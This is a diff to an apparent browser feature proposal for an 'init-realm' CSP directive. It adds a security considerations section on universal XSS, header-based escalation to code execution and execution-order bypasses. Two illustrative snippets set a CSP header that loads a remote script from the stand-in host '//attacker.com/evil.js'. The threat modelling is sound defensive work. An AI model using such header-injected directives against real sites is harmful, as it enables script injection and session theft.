@@ -31,6 +31,7 @@ document.body.appendChild(iframe);
 * [Use Cases](#Use-Cases)
 * [Value](#Value)
 * [Discussion](#Discussion)
+* [Considerations](#Considerations)
 * [Self-Review Questionnaire: Security and Privacy](#self-review-questionnaire-security-and-privacy)
 * [Terminology](#Terminology)
 * [Resources](#Resources)
@@ -322,6 +323,56 @@ And will execute the scripts in that order.
 ### Comparison with `X-frames` and `frame-src`
 
 `X-frames` and `frame-src` allow controlling what is allowed to be loaded into an `iframe`. Regardless of their use to deny loading content in iframes, ways to crete new same origin realms remain available, such as creating an `about:blank` iframe, opening a new tab using `open` API and more.
+
+## Considerations
+
+This section focuses on providing important notes to consider in aspects of privacy and security, which should be later on taken into account when integrating this proposal into the relevant specs.
+
+### Privacy
+
+This feature doesn't provide any information about the user, and hence doesn't have privacy aspects to consider.
+
+### Security
+
+Here are some security risks to take into consideration when following this spec for implementation purposes:
+
+#### Universal XSS
+
+Since this proposal focuses on the thin line between same and cross origins, it may put SOP in danger if not implemented correctly.
+
+This proposal enables any top-level document to execute remote scripts in same-origin realms.
+
+If implementations somehow enable that execution to happen in cross-origin realms, that can enable cross-origin scripting in those realms.
+
+Since such scenrio is the result of a browser level mistake, running cross-origin scripts like that can be abused by attackers against any origin they choose, making this a far more dangerous version of XSS known as Universal XSS.
+
+Therefore it's important for implementations to get that part right, and for tests to throughly cover that possibility (this is similar to other powerful features that heavily rely on the same-origin policy, such as Service Workers).
+
+#### Escalation to Code Execution
+
+From the perspective of an attacker, this proposal can also be thought of as a way to escalate a CSP directive set to full code execution, because of the attacker doesn't find a way to introduce an XSS to the web app, but can somehow control parts of the response's headers, they can translate such capability to an effective XSS using this proposal, by simply configuring a CSP header with the proposed `init-realm` directive pointing to a remote script they control:
+
+```html
+<!-- Content-Security-Policy: init-realm: //attacker.com/evil.js -->
+
+<html location="//example.com">
+</html>
+```
+
+Therefore, it might be important to make sure the address to the remote script resource introduced in the proposed `init-realm` directive properly obeys to other parts of CSP that have the power to mitigate it so attackers won't be able to load them by remote resources the control (e.g. `//attacker.com/evil.js`) nor local ones (e.g. `blob:https://web.app/aa14dc0d-c44c-4072-b918-bff92d26b9b7`):
+
+```html
+<!-- Content-Security-Policy: script-src: 'self'; init-realm: //attacker.com/evil.js -->
+
+<html location="//example.com">
+</html>
+```
+
+#### Integrity of Execution Order
+
+When implementing this proposal, it is crucial to correctly instruct the browser to make sure the script provided via the `init-realm` CSP directive is the first JavaScript code to run within the realm, as in before any scripts dictated to run by its associated document (and to repeat that to all nested same origin realms).
+
+Otherwise, a malicious entity can find a way to introduce their own JavaScript code to run before the `init-realm` script, which would count as a complete bypass of this feature effectively which would miss the goal entirely.
 
 ## [Self-Review Questionnaire: Security and Privacy](https://w3ctag.github.io/security-questionnaire/)
 
